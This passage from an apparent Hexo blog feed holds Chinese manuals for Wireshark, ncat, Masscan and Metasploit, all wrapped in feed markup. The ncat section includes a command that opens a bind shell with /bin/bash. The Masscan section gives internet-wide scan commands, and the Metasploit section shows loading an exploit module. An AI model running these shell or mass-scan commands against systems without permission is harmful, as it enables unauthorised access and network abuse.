        &lt;h2 id=&quot;1-vim模式&quot;&gt;&lt;a href=&quot;#1-vim模式&quot; class=&quot;headerlink&quot; title=&quot;1. vim模式#&quot;&gt;&lt;/a&gt;1. vim模式&lt;a href=&quot;https://www.cnblogs.com/wongbingming/p/1130521
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="文本处理" scheme="http://yoursite.com/tags/%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>wireshark手册</title>
    <link href="http://yoursite.com/2020/02/04/wireshark%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/02/04/wireshark%E6%89%8B%E5%86%8C/</id>
    <published>2020-02-04T08:40:50.000Z</published>
    <updated>2020-02-15T16:28:58.394Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Wireshark简介"><a href="#Wireshark简介" class="headerlink" title="Wireshark简介"></a>Wireshark简介</h3><p>Wireshark是一款最流行和强大的开源数据包抓包与分析工具，没有之一。在SecTools安全社区里颇受欢迎，曾一度超越Metasploit、Nessus、Aircrack-ng等强悍工具。该软件在网络安全与取证分析中起到了很大作用，作为一款网络数据嗅探与协议分析器，已经成为网络运行管理、网络故障诊断、网络应用开发与调试的必用工具。</p><h3 id="Wireshark入门"><a href="#Wireshark入门" class="headerlink" title="Wireshark入门"></a>Wireshark入门</h3><h4 id="客户端界面"><a href="#客户端界面" class="headerlink" title="客户端界面"></a>客户端界面</h4><p>打开Wireshark后，能够看到三个区域。最上方是工具栏区域，可以开始捕获、停止捕获等操作。中间是Cpature Filter区域，能够在开始捕获前指定过滤规则。下方是可以捕获的网络设备，双击其中一个设备后就开始进行网络流量的捕获。</p><p><img src="/picture/4/1.png" alt=""></p><p>结果的展示主要分三个区域，最上方是请求和响应列表，每一条记录表示一次请求或响应的交互。中间是对选中的交互解析后的结果。最下方是原始的数据格式。在请求列表上方，我们可以指定 Display Filter，用于筛选已经捕获到的数据。</p><p><img src="/picture/4/2.png" alt=""></p><h4 id="首选项-Edit—–-gt-Preferences"><a href="#首选项-Edit—–-gt-Preferences" class="headerlink" title="首选项(Edit—–&gt;Preferences)"></a>首选项(Edit—–&gt;Preferences)</h4><p>Wireshark首选项分为6个主要部分，外加1个高级选项。</p><ol><li>Appearance(外观)：这些选项决定了Wireshark将如何显示数据。比如是否保存窗口的位置、3个主要窗口的布局、滚动条的摆放、Packet List面板中列的摆放、显示捕获数据的字体、前景色和背景色等。</li><li>Capture(捕获)：这些选项可以让你对自己捕获数据包的方式进行特殊的设定，比如你默认使用的设备、是否默认使用混杂模式、是否实时更新Packet List面板等。</li><li>Filter Expressions（过滤器表达式）：设置标准去过滤流量。</li><li>NameResolutions（名称解析）：通过这些设定，可以使Wireshark将地址（包括MAC、网络以及传输名称解析）解成更加容易分辨的名字。并且可以设定并发处理称解析的最大数目。</li><li>Protocols(协议)：调整关于捕捉和显示各种Wireshark解码数据包的功能。</li><li>statistics(统计)：关于统计功能的选项。</li><li>Advanced(高级)：在以上6个部分中没有做的设置会被归类到这里。</li></ol><h4 id="数据包色彩高亮"><a href="#数据包色彩高亮" class="headerlink" title="数据包色彩高亮"></a>数据包色彩高亮</h4><p>wireshark通过Coloring Rules(着色规则)窗口可以轻松查看或者修改每个协议所对应的颜色。View—-&gt;Coloring Rules</p><p><img src="/picture/4/3.png" alt=""></p><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>可以在Help—-&gt;about Wireshark—-&gt;Folders中查看。在个性化设置那里是分全局设置和个人设置。</p><p><img src="/picture/4/4.png" alt=""></p><h4 id="配置方案"><a href="#配置方案" class="headerlink" title="配置方案"></a>配置方案</h4><p>可以通过Edit—&gt;Configuration Profiles选项或者在屏幕右下角右键并选择Manage Profiles选项来查看配置方案列表。可以在此添加配置方案。其中每个配置方案都会存储在单独的目录中，可以非常方便的备份或者共享给其他人。</p><p>一个配置方案储存了下面的设置：</p><ul><li><p>Preferences 参数选项</p></li><li><p>Capture filters 捕获过滤器</p></li><li><p>Display filters 显示过滤器</p></li><li><p>Coloring rules 着色规则</p></li><li><p>Disabled protocols 已禁用的协议</p></li><li><p>Forced decodes 强制解码</p></li><li><p>Recent settings 最近设置，比如窗格大小，菜单设置和列宽。</p></li><li><p>Protocol-sepecific tables 针对特定协议的表格，如SNMP用户和自定义HTTP头。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Wireshark简介&quot;&gt;&lt;a href=&quot;#Wireshark简介&quot; class=&quot;headerlink&quot; title=&quot;Wireshark简介&quot;&gt;&lt;/a&gt;Wireshark简介&lt;/h3&gt;&lt;p&gt;Wireshark是一款最流行和强大的开源数据包抓包与分析工具，没有
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="网络工具" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>NC手册</title>
    <link href="http://yoursite.com/2020/02/02/NC%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/02/02/NC%E6%89%8B%E5%86%8C/</id>
    <published>2020-02-02T02:24:46.000Z</published>
    <updated>2020-02-25T15:21:01.986Z</updated>
    
    <content type="html"><![CDATA[<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><p>-u    使用udp连接（不适用-u的话默认是使用tcp连接）<br>-v    输出详细的连接产生的日志<br>-n    不解析域名<br>-l    绑定并侦听传入的连接（一般用于服务端）<br>-c    通过/bin/sh 执行客户端参数过来的指令（通常使用方法为 -c bash）<br>-w    设置连接超时时间<br>–ssl    传输过程中使用ssl加密（服务端和客户端都要使用这个参数）</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ol><li>连接目标端口</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat IP PORT</span><br></pre></td></tr></table></figure><p>文件传输</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">服务端:</span><br><span class="line">ncat -lv 333 &gt; lybbn.txt</span><br><span class="line">客户端:</span><br><span class="line">ncat -nv 172.16.0.182 333 &lt; lybbnclient.txt</span><br></pre></td></tr></table></figure><p>客户端使用ncat加密连接服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">服务端:</span><br><span class="line">ncat -nvl 333 -c &#x2F;bin&#x2F;bash --ssl</span><br><span class="line">客户端:</span><br><span class="line">ncat -nv 172.16.0.182 333 --ssl</span><br></pre></td></tr></table></figure><p>访问控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">指定允许ip:</span><br><span class="line">ncat -lvp 8888 --allow 10.2.67.204</span><br><span class="line">指定拒绝ip:</span><br><span class="line">ncat -lvp 8888 --deny 10.2.67.204</span><br><span class="line">指定允许的网段:</span><br><span class="line">ncat -lvp 8888 --allow 10.2.67.0&#x2F;24</span><br><span class="line">ncat -lvp 8888 --allow 10.2.67.0-255</span><br><span class="line">允许访问的地址列表:</span><br><span class="line">ncat -lvp 8888 --allowfile trusted_hosts.txt</span><br><span class="line">设置最大连接数为5:</span><br><span class="line">ncat -lvp 8888 --max-conns 5</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;常用参数&quot;&gt;&lt;a href=&quot;#常用参数&quot; class=&quot;headerlink&quot; title=&quot;常用参数&quot;&gt;&lt;/a&gt;常用参数&lt;/h3&gt;&lt;p&gt;-u    使用udp连接（不适用-u的话默认是使用tcp连接）&lt;br&gt;-v    输出详细的连接产生的日志&lt;br&gt;-n  
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="网络工具" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Masscan手册</title>
    <link href="http://yoursite.com/2020/02/01/Masscan%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/02/01/Masscan%E6%89%8B%E5%86%8C/</id>
    <published>2020-02-01T05:24:43.000Z</published>
    <updated>2020-02-25T15:28:27.015Z</updated>
    
    <content type="html"><![CDATA[<p><strong>基本</strong></p><p>nmap是港口扫描仪的合法王位，而今天仍然是最通用的选择。但对于纯粹的速度也有一些已经超越了它，包括scanrand，unicornscan，zmap，和现在<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">masscan</a>。</p><p>异步传输意味着扫描仪在发送探测器之前不必等待回复。</p><p>masscan是为了尽可能快地扫描整个互联网而创建的，根据其作者<a href="https://twitter.com/erratarob" target="_blank" rel="noopener">robert graham</a>，这可以在不到6分钟内完成，每秒大约1000万个数据包。</p><p>在这个简短的教程中，我们将学习基础知识并提供一些真实的例子。</p><p><strong>安装</strong></p><p>无论是Linux还是MacOs，安装masscan都非常简单</p><p>Debian/Ubnutu上安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install clang git gcc make libpcap-dev&#96;&#96;$ git clone https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan&#96;&#96;$ cd masscan&#96;&#96;$ make</span><br></pre></td></tr></table></figure><p>Mac os安装</p><p><strong>单端口扫描</strong></p><p>扫描443端口的B类子网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan 10.11.0.0&#x2F;16 -p443</span><br></pre></td></tr></table></figure><p><strong>多端口扫描</strong></p><p>扫描80或443端口的B类子网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 -p80,443</span><br></pre></td></tr></table></figure><p><strong>扫描一系列端口</strong></p><p>扫描22到25端口的B类子网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 -p22-25</span><br></pre></td></tr></table></figure><p><strong>快速扫描</strong></p><p>使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。</p><p>默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。</p><p>扫描100个常见端口的B类子网，每秒100,000个数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 --top-ports 100 -rate 100000</span><br></pre></td></tr></table></figure><p>你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。</p><p><strong>排除目标</strong></p><p>因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。</p><p>扫描B类子网，但避免在exclude.txt中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 --top-ports 100 --excludefile exclude.txt</span><br></pre></td></tr></table></figure><p><strong>结果保存</strong></p><p>您可以使用标准的Unix重定向器将输出发送到文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ Masscan 10.11.0.0&#x2F;16 --top-ports 100 &gt; results.txt</span><br></pre></td></tr></table></figure><p> 除此之外，您还具有以下输出选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;-oX filename：输出到filename的XML。&#96;&#96; &#96;&#96;-oG filename：输出到filename在的grepable格式。&#96;&#96; &#96;&#96;-oJ filename：输出到filename在JSON格式。</span><br></pre></td></tr></table></figure><p><strong>Nmap功能</strong></p><p>正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项：</p><p>通过传递–nmap开关可以看到类似nmap的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. -iL filename：从文件读取输入。&#96;&#96;2. ‐‐exclude filename：在命令行中排除网络。&#96;&#96;3. ‐‐excludefile：从文件中排除网络。&#96;&#96;4. -S：欺骗源IP。&#96;&#96;5. -v interface：详细输出。&#96;&#96;6. -vv interface：非常冗长的输出。&#96;&#96;7. -e interface：使用指定的接口。&#96;&#96;8. -e interface：使用指定的接口。</span><br></pre></td></tr></table></figure><p><strong>快速开始</strong></p><p><img src="/picture/15/1.png" alt="Masscan教程和入门手册"></p><p> 好的，这里有一些快速和功能的扫描示例，您可以开始，然后调整您的口味和要求。</p><p> 我们假设你想快速扫描。</p><p> 扫描web端口的网络</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ masscan 10.11.0.0&#x2F;16 -p80,443,8080 - 达 1000000</span><br></pre></td></tr></table></figure><p> 扫描十大端口的网络</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ masscan 10.11.0.0&#x2F;16 - top-ten- rate 1000000</span><br></pre></td></tr></table></figure><p> 扫描所有端口的网络</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ masscan 10.11.0.0&#x2F;16 -p0-65535 - rate 1000000</span><br></pre></td></tr></table></figure><p> 扫描一个端口的互联网</p><p> 我们将速度提高到每秒1000万，这将最大限度地延伸。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ masscan 0.0.0.0&#x2F;0 -p443 - rate 10000000</span><br></pre></td></tr></table></figure><p> 扫描所有端口的互联网</p><p> 一般来说，如果您尝试这种情况，您应该预期会发生坏的和/或惊人的事情。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;$ masscan 0.0.0.0&#x2F;0 -p0-65535 -rate 10000000</span><br></pre></td></tr></table></figure><p><strong>结语</strong></p><p>masscan油一个独特的功能是，您可以轻松地暂停和恢复扫描。当您按ctrl-c文件被创建时，调用paused.conf该文件具有扫描的所有设置和进度。您可以继续扫描‐‐resume paused.conf</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;基本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;nmap是港口扫描仪的合法王位，而今天仍然是最通用的选择。但对于纯粹的速度也有一些已经超越了它，包括scanrand，unicornscan，zmap，和现在&lt;a href=&quot;https://github.com/rob
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="网络工具" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit手册</title>
    <link href="http://yoursite.com/2020/01/28/Metasploit%E6%89%8B%E5%86%8C/"/>
    <id>http://yoursite.com/2020/01/28/Metasploit%E6%89%8B%E5%86%8C/</id>
    <published>2020-01-28T15:25:12.000Z</published>
    <updated>2020-02-25T15:09:03.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="msf基本命令"><a href="#msf基本命令" class="headerlink" title="msf基本命令"></a>msf基本命令</h2><h3 id="所有命令"><a href="#所有命令" class="headerlink" title="所有命令"></a>所有命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?</span><br><span class="line">核心命令</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">？   帮助菜单</span><br><span class="line">banner   显示一个真棒metasploit横幅</span><br><span class="line">cd   更改当前的工作目录</span><br><span class="line">color   切换颜色</span><br><span class="line">connect   连接与主机通信</span><br><span class="line">exit   退出控制台</span><br><span class="line">get   获取特定于上下文的变量的值</span><br><span class="line">getg   获取全局变量的值</span><br><span class="line">grep grep另一个命令的输出</span><br><span class="line">help   帮助菜单</span><br><span class="line">history   显示命令历史</span><br><span class="line">irb   进入irb脚本模式</span><br><span class="line">load   加载一个框架插件</span><br><span class="line">quit   退出控制台</span><br><span class="line">route   通过会话路由流量</span><br><span class="line">save   保存活动的数据存储</span><br><span class="line">sessions    转储会话列表并显示有关会话的信息</span><br><span class="line">set   将特定于上下文的变量设置为一个值</span><br><span class="line">setg   将全局变量设置为一个值</span><br><span class="line">sleep   在指定的秒数内不做任何事情</span><br><span class="line">spool   将控制台输出写入文件以及屏幕</span><br><span class="line">threads   线程查看和操作后台线程</span><br><span class="line">unload   卸载框架插件</span><br><span class="line">unset   取消设置一个或多个特定于上下文的变量</span><br><span class="line">unsetg   取消设置一个或多个全局变量</span><br><span class="line">version   显示框架和控制台库版本号</span><br><span class="line">模块命令</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">advanced   显示一个或多个模块的高级选项</span><br><span class="line">back   从当前上下文返回</span><br><span class="line">edit   使用首选编辑器编辑当前模块</span><br><span class="line">info   显示有关一个或多个模块的信息</span><br><span class="line">loadpath   路径从路径搜索并加载模块</span><br><span class="line">options   显示全局选项或一个或多个模块</span><br><span class="line">popm   将最新的模块从堆栈中弹出并使其处于活动状态</span><br><span class="line">previous   将之前加载的模块设置为当前模块</span><br><span class="line">pushm   将活动或模块列表推入模块堆栈</span><br><span class="line">reload_all   从所有定义的模块路径重新加载所有模块</span><br><span class="line">search   搜索模块名称和描述</span><br><span class="line">show   显示给定类型的模块或所有模块</span><br><span class="line">use   按名称选择模块</span><br><span class="line">工作命令</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">handler   作为作业启动负载处理程序</span><br><span class="line">jobs   显示和管理作业</span><br><span class="line">kill   杀死一个工作</span><br><span class="line">rename_job   重命名作业</span><br><span class="line">资源脚本命令</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">makerc   保存从开始到文件输入的命令</span><br><span class="line">resource   运行存储在文件中的命令</span><br><span class="line">数据库后端命令</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">db_connect   连接到现有的数据库</span><br><span class="line">db_disconnect   断开与当前数据库实例的连接</span><br><span class="line">db_export   导出包含数据库内容的文件</span><br><span class="line">db_import   导入扫描结果文件（文件类型将被自动检测）</span><br><span class="line">db_nmap   执行nmap并自动记录输出</span><br><span class="line">db_rebuild_cache   重建数据库存储的模块高速缓存</span><br><span class="line">db_status   显示当前的数据库状态</span><br><span class="line">hosts   列出数据库中的所有主机</span><br><span class="line">loot   列出数据库中的所有战利品</span><br><span class="line">notes   列出数据库中的所有笔记</span><br><span class="line">services   列出数据库中的所有服务</span><br><span class="line">vulns   列出数据库中的所有漏洞</span><br><span class="line">workspace   在数据库工作区之间切换</span><br><span class="line">凭证后端命令</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">creds   列出数据库中的所有凭据</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><p>在msf中关于help功能，有三种方式，分别是 “?” 、“help”、“-h”。<br>系统命令的习惯也是保留的</p><ol><li>show<br>它的作用是显示当前所有可利用资源,</li></ol><ul><li>正常使用的时候，show 模块名称就可以了。</li><li>show options 查看需要配置的选项</li><li>show missing 是显示缺失的必填项。</li><li>show payload 如果你的所查询漏洞是只在lunix平台下的，出来的只会是针对lunix平台的payloads</li></ul><ol><li><h3 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h3></li><li><p>connect</p></li></ol><ul><li><p>瑞士军刀netcat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li><li><pre><code>[*] Connected to 127.0.0.1:22SSH-2.0-OpenSSH_8.0<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. search</span><br><span class="line"></span><br><span class="line">- search的功能可以让我们随时在msf的海量脚本中拿到我们想要的。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>msf5 &gt; search mysqlMatching Modules================   #   Name                                                  Disclosure Date  Rank       Check  Description   -   ----                                                  ---------------  ----       -----  -----------   0   auxiliary/admin/http/manageengine_pmp_privesc         2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. use</span><br><span class="line"></span><br><span class="line">- 使用选中模块</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>msf5 &gt; use exploit/windows/mysql/mysql_start_upmsf5 exploit(windows/mysql/mysql_start_up) &gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. info</span><br><span class="line"></span><br><span class="line">- info命令用于查看当前模块信息</span><br><span class="line"></span><br><span class="line">- basic options 中的内容就是我们需要配置的内容。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>msf5 exploit(windows/mysql/mysql_start_up) &gt; info windows/mysql/mysql_start_up       Name: Oracle MySQL for Microsoft Windows FILE Privilege Abuse     Module: exploit/windows/mysql/mysql_start_up   Platform: Windows       Arch:  Privileged: No    License: Metasploit Framework License (BSD)       Rank: Excellent  Disclosed: 2012-12-01.............<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. set</span><br><span class="line"></span><br><span class="line">- set命令进行赋值操作。</span><br><span class="line"></span><br><span class="line">1. edit</span><br><span class="line"></span><br><span class="line">- 其实就是以vi命令打开选中的脚本文件</span><br><span class="line"></span><br><span class="line">1. unset </span><br><span class="line"></span><br><span class="line">- 取消赋值</span><br><span class="line"></span><br><span class="line">1. run&#x2F;exploit 这</span><br><span class="line"></span><br><span class="line">- 两个命令都是运行脚本，其实功能完全一致，只是习惯上exploit再exploits模块下 使用，仅此而已。</span><br><span class="line"></span><br><span class="line">1. job&#x2F;kill</span><br><span class="line"></span><br><span class="line">- jobs命令在你运行脚本的时候会记录工作进程，kill对应干掉它（随着我跟开发接触越来越多，发现老开发从不说删掉，都是干掉！干掉！干掉！！</span><br><span class="line"></span><br><span class="line">1. sessions</span><br><span class="line"></span><br><span class="line">- 当你的脚本与目标服务器建立链接，或者说拿到了shell时，你输入sessions命令可以看到具体的监听端口。</span><br><span class="line"></span><br><span class="line">1. resource </span><br><span class="line"></span><br><span class="line">- 可以直接执行我们预定好的操作</span><br><span class="line"></span><br><span class="line">## msf模块</span><br><span class="line"></span><br><span class="line">### MSF架构</span><br><span class="line"></span><br><span class="line">1. Rex功能库实际来讲并不属于MSF，为什么这么讲呢？如HTTP&#x2F;TELNET&#x2F;SSH等连接功能严格来讲是属于操作系统自带的功能，MSF只是去以一个用户的身份去调用它而已；同理上述提到的编码功能。</span><br><span class="line">2. Core库是真正属于MSF的最底层的库，其中包含的都是MSF框架的底层功能，如数据管理，session管理，插件管理这些核心底层功能。</span><br><span 